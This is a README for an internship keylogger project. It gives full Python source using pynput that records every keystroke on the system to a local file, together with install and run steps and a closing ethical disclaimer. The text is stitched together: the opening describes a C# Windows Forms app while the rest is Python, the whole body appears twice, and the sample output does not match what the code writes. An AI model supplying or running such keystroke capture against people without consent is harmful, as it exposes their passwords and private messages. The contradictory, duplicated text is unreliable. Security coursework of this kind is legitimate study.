# Prodigyinfotech-cybersecurity-internship-task-4
This project is a simple Keylogger application built in C# using Windows Forms. The application runs with a blank form (no buttons or controls), and continuously monitors all key presses made by the user while the form is active. Every keystroke is recorded and stored inside a text file (key_log.txt).
🖥️ Task-04: Simple Keylogger

Prodigy Infotech Internship Project

📌 Overview

This project is a Simple Keylogger built in Python using the pynput library.
It continuously monitors keystrokes and logs them into a text file (key_log.txt).
The program stops gracefully when the ESC key is pressed.

🎯 Objectives

Capture all keyboard inputs.

Save keystrokes in a log file.

Handle both normal keys and special keys.

Stop logging when ESC is pressed.

🛠️ Tools & Technologies

Language: Python 3.x

Library: pynput

Platform: Windows/Linux

Output File: key_log.txt

🚀 Implementation
📂 Code File: keylogger.py
from pynput import keyboard

# File where keystrokes will be saved
log_file = "key_log.txt"

def on_press(key):
    try:
        # Try to log the character key
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (like enter, space, shift, etc.)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def on_release(key):
    # Stop the keylogger if ESC is pressed
    if key == keyboard.Key.esc:
        print("\n[+] Keylogger stopped (ESC pressed).")
        return False

print("[+] Keylogger is running... (Press ESC to stop)")

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

📂 Output Example

If user types:

hello 123


Then key_log.txt will contain:

h e l l o [Key.space] 1 2 3 [Key.enter] [Key.esc]

📌 How to Run

Install required library:

pip install pynput


Run the program:

python keylogger.py


Type anything in your system.

Press ESC to stop logging.

Check the key_log.txt file for recorded keystrokes.

⚠️ Ethical Disclaimer

This project is for educational purposes only under the Prodigy Infotech internship.
Keyloggers can capture sensitive information (like passwords & private messages).
Do NOT use it for malicious or illegal activities. Always ensure proper consent before running.🖥️ Task-04: Simple Keylogger

Prodigy Infotech Internship Project

📌 Overview

This project is a Simple Keylogger built in Python using the pynput library.
It continuously monitors keystrokes and logs them into a text file (key_log.txt).
The program stops gracefully when the ESC key is pressed.

🎯 Objectives

Capture all keyboard inputs.

Save keystrokes in a log file.

Handle both normal keys and special keys.

Stop logging when ESC is pressed.

🛠️ Tools & Technologies

Language: Python 3.x

Library: pynput

Platform: Windows/Linux

Output File: key_log.txt

🚀 Implementation
📂 Code File: keylogger.py
from pynput import keyboard

# File where keystrokes will be saved
log_file = "key_log.txt"

def on_press(key):
    try:
        # Try to log the character key
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (like enter, space, shift, etc.)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def on_release(key):
    # Stop the keylogger if ESC is pressed
    if key == keyboard.Key.esc:
        print("\n[+] Keylogger stopped (ESC pressed).")
        return False

print("[+] Keylogger is running... (Press ESC to stop)")

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

📂 Output Example

If user types:

hello 123


Then key_log.txt will contain:

h e l l o [Key.space] 1 2 3 [Key.enter] [Key.esc]

📌 How to Run

Install required library:

pip install pynput


Run the program:

python keylogger.py


Type anything in your system.

Press ESC to stop logging.

Check the key_log.txt file for recorded keystrokes.

⚠️ Ethical Disclaimer

This project is for educational purposes only under the Prodigy Infotech internship.
Keyloggers can capture sensitive information (like passwords & private messages).
Do NOT use it for malicious or illegal activities. Always ensure proper consent before running.


Author
Saira Arshad
